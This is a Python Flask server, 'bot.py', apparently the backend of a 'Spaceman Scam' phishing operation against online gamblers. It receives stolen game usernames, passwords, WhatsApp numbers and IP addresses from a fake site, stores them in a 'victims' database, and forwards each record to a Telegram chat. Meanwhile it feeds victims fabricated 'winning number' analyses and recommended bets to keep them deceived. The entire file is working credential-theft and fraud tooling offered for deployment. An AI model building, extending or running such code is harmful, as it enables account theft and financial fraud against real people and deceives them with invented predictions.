#!/usr/bin/env python3
# bot.py - Main bot server for Spaceman Scam (Cloud Ready)

import json
import sqlite3
import logging
import hashlib
from datetime import datetime
from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import threading
import time
import random
import os

# Import configuration
import setting

# Setup logging
logging.basicConfig(
    level=getattr(logging, setting.LOGGING["LEVEL"]),
    format=setting.LOGGING["FORMAT"],
    handlers=[
        logging.FileHandler(setting.LOGGING["FILE"]),
        logging.StreamHandler()
    ]
)

logger = logging.getLogger(__name__)

# Initialize Flask app
app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}})

# Database setup
def init_database():
    """Initialize SQLite database"""
    try:
        os.makedirs(setting.PATHS["DATABASE_DIR"], exist_ok=True)
        
        conn = sqlite3.connect(setting.DATABASE["PATH"])
        cursor = conn.cursor()
        
        # Create victims table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS victims (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT UNIQUE,
                game_url TEXT,
                game_username TEXT NOT NULL,
                game_password TEXT NOT NULL,
                whatsapp_number TEXT,
                ip_address TEXT,
                user_agent TEXT,
                received_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                telegram_sent BOOLEAN DEFAULT 0,
                telegram_message_id TEXT,
                status TEXT DEFAULT 'pending',
                notes TEXT
            )
        ''')
        
        # Create logs table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                level TEXT,
                message TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Create stats table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS stats (
                date DATE PRIMARY KEY,
                victims_count INTEGER DEFAULT 0,
                telegram_sent INTEGER DEFAULT 0,
                last_update TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        conn.commit()
        conn.close()
        logger.info("Database initialized successfully")
        
    except Exception as e:
        logger.error(f"Database initialization failed: {e}")
        raise

# Bot functions
class SpacemanBot:
    def __init__(self):
        self.start_time = datetime.now()
        self.victims_processed = 0
        self.telegram_sent = 0
        self.rate_limits = {}
        
    def generate_victim_id(self, data):
        """Generate unique victim ID"""
        victim_string = f"{data.get('gameUsername', '')}{datetime.now().timestamp()}"
        return hashlib.md5(victim_string.encode()).hexdigest()[:12]
    
    def save_victim(self, data, ip_address):
        """Save victim data to database"""
        try:
            victim_id = self.generate_victim_id(data)
            
            conn = sqlite3.connect(setting.DATABASE["PATH"])
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT INTO victims 
                (victim_id, game_url, game_username, game_password, whatsapp_number, ip_address, user_agent, received_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                victim_id,
                data.get('gameUrl', ''),
                data.get('gameUsername', ''),
                data.get('gamePassword', ''),
                data.get('whatsappNumber', ''),
                ip_address,
                data.get('userAgent', ''),
                datetime.now().isoformat()
            ))
            
            conn.commit()
            conn.close()
            
            self.victims_processed += 1
            logger.info(f"Victim saved: {victim_id}")
            
            return victim_id
            
        except Exception as e:
            logger.error(f"Failed to save victim: {e}")
            return None
    
    def send_to_telegram(self, victim_id, data):
        """Send victim data to Telegram"""
        try:
            message = self.format_telegram_message(victim_id, data)
            
            url = f"https://api.telegram.org/bot{setting.TELEGRAM['BOT_TOKEN']}/sendMessage"
            payload = {
                "chat_id": setting.TELEGRAM["CHAT_ID"],
                "text": message,
                "parse_mode": setting.TELEGRAM["PARSE_MODE"],
                "disable_notification": setting.TELEGRAM["DISABLE_NOTIFICATION"]
            }
            
            response = requests.post(url, json=payload, timeout=10)
            
            if response.status_code == 200:
                result = response.json()
                message_id = result.get('result', {}).get('message_id')
                
                # Update database
                conn = sqlite3.connect(setting.DATABASE["PATH"])
                cursor = conn.cursor()
                cursor.execute(
                    "UPDATE victims SET telegram_sent = 1, telegram_message_id = ?, status = 'telegram_sent' WHERE victim_id = ?",
                    (message_id, victim_id)
                )
                conn.commit()
                conn.close()
                
                self.telegram_sent += 1
                logger.info(f"Telegram sent for victim: {victim_id}")
                
                return True, message_id
            else:
                logger.error(f"Telegram API error: {response.text}")
                return False, None
                
        except Exception as e:
            logger.error(f"Failed to send to Telegram: {e}")
            return False, None
    
    def format_telegram_message(self, victim_id, data):
        """Format message for Telegram"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        message = f"""🎰 *NEW VICTIM CAPTURED* 🎰

🆔 *Victim ID:* `{victim_id}`
⏰ *Time:* {timestamp}

👤 *GAME CREDENTIALS:*
• Username: `{data.get('gameUsername', 'N/A')}`
• Password: `{data.get('gamePassword', 'N/A')}`
• Game URL: {data.get('gameUrl', 'N/A')}

📱 *CONTACT:*
• WhatsApp: {data.get('whatsappNumber', 'N/A')}

🌐 *SYSTEM INFO:*
• IP: `{data.get('ip', 'N/A')}`
• User Agent: {data.get('userAgent', 'N/A')[:50]}...

📊 *BOT STATS:*
• Total Victims: {self.victims_processed}
• Bot Uptime: {self.get_uptime()}
• Success Rate: {setting.SCAM['SUCCESS_RATE']}%

⚠️ _Data automatically logged to database_
"""
        return message
    
    def get_uptime(self):
        """Calculate bot uptime"""
        delta = datetime.now() - self.start_time
        hours, remainder = divmod(delta.seconds, 3600)
        minutes, seconds = divmod(remainder, 60)
        return f"{hours}h {minutes}m {seconds}s"
    
    def get_stats(self):
        """Get bot statistics"""
        conn = sqlite3.connect(setting.DATABASE["PATH"])
        cursor = conn.cursor()
        
        cursor.execute("SELECT COUNT(*) FROM victims")
        total_victims = cursor.fetchone()[0]
        
        cursor.execute("SELECT COUNT(*) FROM victims WHERE telegram_sent = 1")
        telegram_sent = cursor.fetchone()[0]
        
        conn.close()
        
        return {
            "total_victims": total_victims,
            "telegram_sent": telegram_sent,
            "bot_uptime": self.get_uptime(),
            "start_time": self.start_time.isoformat(),
            "version": setting.SCAM["VERSION"]
        }

# Initialize bot
bot = SpacemanBot()

# API Routes
@app.route('/')
def home():
    """Home page"""
    return jsonify({
        "app": setting.SCAM["PROJECT_NAME"],
        "version": setting.SCAM["VERSION"],
        "status": "online",
        "endpoints": setting.API["ENDPOINTS"],
        "uptime": bot.get_uptime(),
        "environment": "cloud" if "PORT" in os.environ else "local"
    })

@app.route('/api/status', methods=['GET'])
def api_status():
    """Check bot status"""
    return jsonify({
        "status": "online",
        "bot_id": bot.generate_victim_id({"gameUsername": "status_check"}),
        "start_time": bot.start_time.isoformat(),
        "victims_count": bot.victims_processed,
        "telegram_sent": bot.telegram_sent,
        "website_url": setting.SCAM["WEBSITE_URL"],
        "environment": "cloud" if "PORT" in os.environ else "local",
        "message": "Spaceman Bot is operational"
    })

@app.route('/api/victim', methods=['POST'])
def api_victim():
    """Receive victim data from website"""
    try:
        # Check rate limiting
        client_ip = request.remote_addr
        current_time = time.time()
        
        if client_ip in bot.rate_limits:
            last_request = bot.rate_limits[client_ip]
            if current_time - last_request < 5:  # 5 seconds cooldown
                return jsonify({
                    "success": False,
                    "error": "Rate limit exceeded",
                    "wait": 5 - int(current_time - last_request)
                }), 429
        
        bot.rate_limits[client_ip] = current_time
        
        # Get and validate data
        data = request.get_json()
        
        if not data:
            return jsonify({"success": False, "error": "No data provided"}), 400
        
        # Validate required fields
        required_fields = setting.API["REQUIRED_FIELDS"]
        for field in required_fields:
            if field not in data or not data[field]:
                return jsonify({
                    "success": False, 
                    "error": f"Missing required field: {field}"
                }), 400
        
        # Save victim data
        victim_id = bot.save_victim(data, client_ip)
        
        if not victim_id:
            return jsonify({
                "success": False,
                "error": "Failed to save victim data"
            }), 500
        
        # Send to Telegram (async)
        telegram_thread = threading.Thread(
            target=bot.send_to_telegram,
            args=(victim_id, data)
        )
        telegram_thread.start()
        
        # Generate fake analysis response
        fake_response = generate_fake_analysis()
        
        # Return success response
        response = {
            "success": True,
            "message": "Victim data received successfully",
            "victim_id": victim_id,
            "bot_id": bot.generate_victim_id(data),
            "analysis": fake_response,
            "next_step": "injection_started",
            "injection_delay": setting.SCAM["INJECTION_DELAY"],
            "confidence": setting.SCAM["SUCCESS_RATE"],
            "timestamp": datetime.now().isoformat()
        }
        
        logger.info(f"API Response: {response}")
        return jsonify(response)
        
    except Exception as e:
        logger.error(f"API Error: {e}")
        return jsonify({
            "success": False,
            "error": str(e),
            "fallback": "Data queued for retry"
        }), 500

@app.route('/api/stats', methods=['GET'])
def api_stats():
    """Get bot statistics"""
    return jsonify(bot.get_stats())

@app.route('/api/logs', methods=['GET'])
def api_logs():
    """Get recent logs"""
    try:
        limit = request.args.get('limit', 10, type=int)
        
        conn = sqlite3.connect(setting.DATABASE["PATH"])
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM logs ORDER BY timestamp DESC LIMIT ?", (limit,))
        logs = cursor.fetchall()
        conn.close()
        
        return jsonify({
            "success": True,
            "logs": [
                {
                    "id": log[0],
                    "level": log[1],
                    "message": log[2],
                    "timestamp": log[3]
                } for log in logs
            ]
        })
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

def generate_fake_analysis():
    """Generate fake pattern analysis"""
    winning_number = random.choice(setting.FAKE_DATA["WINNING_NUMBERS"])
    pattern = random.choice(setting.FAKE_DATA["PATTERNS"])
    message = random.choice(setting.FAKE_DATA["SUCCESS_MESSAGES"])
    
    return {
        "winning_number": winning_number,
        "pattern_detected": pattern,
        "confidence": round(random.uniform(85.0, 99.9), 1),
        "message": message,
        "recommended_bet": f"Rp {random.randint(500, 5000)}.000",
        "optimal_time": f"{random.randint(14, 23)}:{random.randint(0, 59):02d} WIB"
    }

# Background tasks
def backup_database():
    """Regular database backup"""
    while True:
        time.sleep(setting.DATABASE["BACKUP_INTERVAL"])
        
        try:
            import shutil
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            backup_file = os.path.join(
                setting.PATHS["BACKUP_DIR"],
                f"victims_backup_{timestamp}.db"
            )
            
            os.makedirs(setting.PATHS["BACKUP_DIR"], exist_ok=True)
            shutil.copy2(setting.DATABASE["PATH"], backup_file)
            
            logger.info(f"Database backed up: {backup_file}")
            
        except Exception as e:
            logger.error(f"Backup failed: {e}")

def cleanup_old_data():
    """Clean up old records"""
    while True:
        time.sleep(86400)  # Daily
        
        try:
            conn = sqlite3.connect(setting.DATABASE["PATH"])
            cursor = conn.cursor()
            
            # Delete records older than 30 days
            cursor.execute("""
                DELETE FROM victims 
                WHERE received_at < datetime('now', '-30 days')
            """)
            
            deleted = cursor.rowcount
            conn.commit()
            conn.close()
            
            if deleted > 0:
                logger.info(f"Cleaned up {deleted} old records")
                
        except Exception as e:
            logger.error(f"Cleanup failed: {e}")

# Cloud deployment setup
def create_app():
    """Create Flask app for cloud deployment"""
    return app

# Main function
if __name__ == "__main__":
    # Initialize database
    init_database()
    
    # Create necessary directories
    for directory in [setting.PATHS["LOGS_DIR"], setting.PATHS["BACKUP_DIR"]]:
        os.makedirs(directory, exist_ok=True)
    
    # Start background threads
    backup_thread = threading.Thread(target=backup_database, daemon=True)
    cleanup_thread = threading.Thread(target=cleanup_old_data, daemon=True)
    backup_thread.start()
    cleanup_thread.start()
    
    # Get port from environment (for cloud)
    port = int(os.environ.get("PORT", setting.SERVER["PORT"]))
    host = setting.SERVER["HOST"]
    
    # Print startup info
    print(f"""
    🚀 SPACEMAN SCAM BOT v{setting.SCAM['VERSION']}
    ==========================================
    🔗 Website: {setting.SCAM['WEBSITE_URL']}
    🌐 API URL: http://{host}:{port}
    📞 Endpoint: http://{host}:{port}/api/victim
    
    📊 Bot Status: ONLINE
    ⏰ Start Time: {bot.start_time.strftime('%Y-%m-%d %H:%M:%S')}
    📈 Success Rate: {setting.SCAM['SUCCESS_RATE']}%
    
    🔧 Configuration Loaded:
    • Telegram Bot: {'CONNECTED' if setting.TELEGRAM['BOT_TOKEN'] else 'DISABLED'}
    • Database: {setting.DATABASE['TYPE'].upper()}
    • Logging: {setting.LOGGING['LEVEL']}
    • Environment: {'CLOUD' if 'PORT' in os.environ else 'LOCAL'}
    • Host: {host}:{port}
    
    📝 Available Endpoints:
    • GET  /              - Bot status
    • GET  /api/status    - API status
    • POST /api/victim    - Submit victim data
    • GET  /api/stats     - Statistics
    • GET  /api/logs      - View logs
    
    🔒 Security: {len(setting.SECURITY['ALLOWED_IPS'])} IPs allowed
    ==========================================
    """)
    
    # Start Flask server
    app.run(host=host, port=port, debug=setting.SERVER["DEBUG"])